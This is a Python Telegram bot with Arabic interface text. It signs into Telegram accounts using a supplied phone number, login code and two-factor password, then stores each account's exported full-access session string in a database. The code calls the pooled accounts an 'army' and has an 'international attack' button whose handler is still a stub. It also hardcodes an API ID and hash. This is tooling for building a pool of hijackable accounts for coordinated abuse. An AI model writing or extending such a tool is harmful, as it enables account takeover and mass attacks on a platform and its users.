import os
import telebot
from telebot import types
from pyrogram import Client
from pyrogram.errors import SessionPasswordNeeded
import psycopg2
from flask import Flask
from threading import Thread

# --- الإعدادات ---
BOT_TOKEN = os.getenv("TG_BOT_TOKEN")
DATABASE_URL = os.getenv("DATABASE_URL")
# هاشات ثابتة "قناع" عشان ما تعور راسك
API_ID = 26569722 
API_HASH = "90a9314c99544976451664d4c1f964fc"

bot = telebot.TeleBot(BOT_TOKEN, threaded=False) # تعطيل الـ Threads لتحسين استجابة الهاندلرز
server = Flask(__name__)
user_data = {}

# --- سيرفر الويب عشان ريندر ---
@server.route("/")
def home():
    return "Mikey Center is Alive!", 200

def run_web():
    server.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))

# --- قاعدة البيانات ---
def get_db_connection():
    return psycopg2.connect(DATABASE_URL)

def init_db():
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("CREATE TABLE IF NOT EXISTS accounts (phone TEXT PRIMARY KEY, session_string TEXT)")
    conn.commit()
    cur.close()
    conn.close()

init_db()

# --- واجهة البوت ---
@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("➕ إضافة حساب للجيش", callback_data="add_acc"))
    markup.add(types.InlineKeyboardButton("📊 الإحصائيات", callback_data="stats"), types.InlineKeyboardButton("📜 اللوج", callback_data="log"))
    markup.add(types.InlineKeyboardButton("☣️ شن الهجوم الدولي", callback_data="attack"))
    bot.send_message(message.chat.id, "🔥 **مقر مايكي للعمليات الضاربة** 🔥\n\nالجيش جاهز والأوامر بيدك. وش نبي نسوي؟", reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    if call.data == "add_acc":
        msg = bot.send_message(call.message.chat.id, "📱 أرسل رقم الهاتف الحين مع المفتاح (مثال: +17539221035):")
        bot.register_next_step_handler(msg, process_phone_step)
    elif call.data == "stats":
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("SELECT COUNT(*) FROM accounts")
        count = cur.fetchone()[0]
        cur.close()
        conn.close()
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, f"📊 **الجيش الحالي:** `{count}` حساب مستعد.")
    elif call.data == "attack":
        bot.send_message(call.message.chat.id, "⚠️ **قسم الهجوم قيد التجهيز...** (ننتقل له بالملف الجاي يا وحش).")

# --- معالجة إضافة الحساب ---
def process_phone_step(message):
    chat_id = message.chat.id
    phone = message.text.strip()
    if not phone.startswith('+'):
        msg = bot.send_message(chat_id, "❌ لازم تبدأ الرقم بـ (+) مع مفتاح الدولة. أرسله صح:")
        bot.register_next_step_handler(msg, process_phone_step)
        return

    bot.send_message(chat_id, "⏳ جاري محاولة الدخول وسحب الكود...")
    
    # استخدام بايروجام في الذاكرة
    client = Client(f"session_{chat_id}", api_id=API_ID, api_hash=API_HASH, in_memory=True)
    try:
        client.connect()
        code_info = client.send_code(phone)
        user_data[chat_id] = {'phone': phone, 'client': client, 'hash': code_info.phone_code_hash}
        msg = bot.send_message(chat_id, f"📩 وصلك كود على {phone}؟ أرسله الحين:")
        bot.register_next_step_handler(msg, process_code_step)
    except Exception as e:
        bot.send_message(chat_id, f"❌ خطأ: {str(e)}")

def process_code_step(message):
    chat_id = message.chat.id
    code = message.text.strip()
    if chat_id not in user_data: return

    data = user_data[chat_id]
    client = data['client']
    
    try:
        client.sign_in(data['phone'], data['hash'], code)
        save_session(message, client, data['phone'])
    except SessionPasswordNeeded:
        msg = bot.send_message(chat_id, "🔐 الحساب محمي بكلمة سر، أرسلها الحين:")
        bot.register_next_step_handler(msg, process_password_step)
    except Exception as e:
        bot.send_message(chat_id, f"❌ كود غلط أو انتهى: {str(e)}")

def process_password_step(message):
    chat_id = message.chat.id
    password = message.text.strip()
    data = user_data.get(chat_id)
    
    try:
        client = data['client']
        client.check_password(password)
        save_session(message, client, data['phone'])
    except Exception as e:
        bot.send_message(chat_id, f"❌ كلمة سر غلط: {str(e)}")

def save_session(message, client, phone):
    string = client.export_session_string()
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("INSERT INTO accounts (phone, session_string) VALUES (%s, %s) ON CONFLICT (phone) DO UPDATE SET session_string = EXCLUDED.session_string", (phone, string))
    conn.commit()
    cur.close()
    conn.close()
    client.disconnect()
    bot.send_message(message.chat.id, f"✅ كفو! الحساب {phone} صار في الجيب وجاهز للشن.")
    del user_data[message.chat.id]

# --- التشغيل ---
if __name__ == "__main__":
    Thread(target=run_web).start()
    print("🚬 Mikey is Online and Ready!")
    bot.infinity_polling(skip_pending=True)
